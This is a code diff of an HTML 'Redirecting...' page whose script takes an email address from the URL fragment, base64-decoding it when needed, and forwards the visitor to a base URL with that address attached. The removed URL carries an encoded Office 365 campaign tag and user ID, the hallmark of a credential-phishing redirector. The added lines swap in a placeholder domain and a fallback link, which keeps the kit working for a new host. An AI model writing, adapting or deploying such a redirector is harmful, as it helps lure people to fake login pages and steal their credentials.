@@ -4,10 +4,10 @@
   <meta charset="UTF-8">
   <title>Redirecting...</title>
   <script>
-    function isValidBase64(str) {
+    function isBase64(str) {
       try {
         const decoded = atob(str);
-        // Check if decoded is a valid email
+        // Check for valid email format after decoding
         return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded);
       } catch (e) {
         return false;
@@ -15,8 +15,8 @@
     }
 
     window.onload = function () {
-      const hash = window.location.hash.substring(1).trim(); // remove '#'
-      const baseUrl = "https://dennbc.com/s/index.php?c3Y9bzM2NV8xX25vbSZyYW5kPU16ck8wJnVpZD1VU0VSMjkwNDIwMjVVMzgwNDI5NDMmcmFuZD1lTDltNA==N0123N/#";
+      const hash = decodeURIComponent(window.location.hash.substring(1)).trim();
+      const baseUrl = "http://newdomain.com/#";
 
       if (!hash) {
         window.location.href = baseUrl;
@@ -25,7 +25,7 @@
 
       let email = hash;
 
-      if (isValidBase64(hash)) {
+      if (isBase64(hash)) {
         email = atob(hash);
       }
 
@@ -35,6 +35,6 @@
   </script>
 </head>
 <body>
-  <p></p>
+  <p>Redirecting... If it doesn't happen automatically, <a id="manualLink" href="#">click here</a>.</p>
 </body>
 </html>
